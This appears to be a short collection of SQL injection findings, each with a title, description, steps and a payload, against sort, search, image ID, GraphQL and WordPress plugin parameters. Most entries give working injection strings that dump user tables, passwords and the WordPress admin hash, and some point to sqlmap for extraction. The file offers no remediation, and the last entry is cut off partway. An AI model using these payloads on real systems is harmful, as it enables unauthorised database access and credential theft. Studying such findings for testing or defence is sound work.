title: Blind SQLi via time-based in sort parameter
desc: Sort parameter not parameterized. SLEEP(5) caused 5s delay confirming blind SQLi.
steps:
1. Inject: ?sort=id;SELECT SLEEP(5)--
2. Measure delay — 5s = vulnerable
3. Use sqlmap to dump

title: Union-based SQLi in search — dump user table
desc: Search parameter reflected in SQL without sanitization. UNION SELECT dumped user credentials.
steps:
1. Confirm: ' OR '1'='1
2. Find column count: ORDER BY 1,2,3...
3. UNION SELECT to dump users
payload: GET /search?q=' UNION SELECT username,password,3,4 FROM users--

title: Boolean-based blind SQLi in image ID
desc: Image ID vulnerable to boolean-based blind SQLi. Different responses for true/false conditions.
steps:
1. Test: /image/1 AND 1=1 vs /image/1 AND 1=2
2. Extract data bit by bit
3. Use sqlmap --technique=B

title: SQLi in GraphQL integer variable
desc: GraphQL query used integer variable directly in SQL. Injecting SQL via integer field bypassed type checks.
steps:
1. Find GraphQL query with integer variable
2. Inject SQL in the integer field
3. Response contains injected data
payload:
POST /graphql
{"query":"{ user(id: \"1 UNION SELECT username,password FROM users LIMIT 1--\") { name } }"}

title: SQLi in WordPress plugin custom query

3. Admin hash returned
payload: GET /wp-admin/admin-ajax.php?action=plugin_query&id=1 UNION SELECT user_pass FROM wp_users LIMIT 1--
